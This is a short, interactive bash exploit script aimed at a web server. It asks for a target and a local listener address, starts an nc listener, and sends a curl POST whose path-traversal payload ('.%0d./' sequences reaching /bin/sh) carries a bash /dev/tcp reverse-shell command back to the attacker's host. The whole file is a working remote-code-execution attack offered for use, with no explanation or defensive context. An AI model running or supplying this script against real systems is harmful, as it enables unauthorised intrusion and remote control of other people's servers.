#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
echo -e "${RED}Enter the address of the target (http://127.0.0.1)${ENDCOLOR}"
read target
echo -e "${RED}Enter the port of the target (80,443)${ENDCOLOR}"
read target_port
echo -e "${RED}Your LHOST for reverse shell:${ENDCOLOR}"
read lhost
echo -e "${RED}Your LPORT for reverse shell:${ENDCOLOR}"
read lport
response=$(curl --write-out '%{http_code}' --silent --output /dev/null $target)
if [[ ${target: -1} != "/" ]];then
	target="${target}/"
fi
clear
echo -e "Targets Status code is $response"
echo "--------------------------------------"
echo "Target     : $target"
echo "Target Port: $target_port"
echo "Local Host : $lhost"
echo "Local Port : $lport"
echo "--------------------------------------"
echo -e "${GREEN}Is this correct? [y/n]:${ENDCOLOR}"
read -n 1 choose
if [[ $choose == "y" ]];then
echo -e "${GREEN}\nOpening new terminal..${ENDCOLOR}"
gnome-terminal -- /bin/bash -c "echo 'Starting in 5 seconds'&&nc -lnvp $lport; exec bash"
sleep 5
curl -X POST --path-as-is "$target.%0d./.%0d./.%0d./.%0d./bin/sh" --data "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' 2>&1"
clear
elif [[ $choose == "n" ]];then
echo -e "\nExiting.."
sleep 1
clear
exit
fi
